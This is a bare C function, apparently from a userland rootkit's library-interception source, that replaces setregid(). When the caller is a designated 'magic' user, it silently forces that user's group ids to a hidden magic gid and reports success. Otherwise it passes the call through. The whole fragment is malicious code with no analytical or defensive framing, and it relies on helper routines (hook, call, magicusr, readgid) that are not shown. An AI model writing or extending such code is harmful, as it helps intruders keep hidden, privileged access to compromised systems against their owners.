int setregid(gid_t rgid, gid_t egid){
    hook(CSETREGID);
    if(magicusr()){
        gid_t magicgid = readgid();
        if(rgid != magicgid || egid != magicgid)
            call(CSETREGID, magicgid, magicgid);
        return 0;
    }
    return (long)call(CSETREGID, rgid, egid);
}
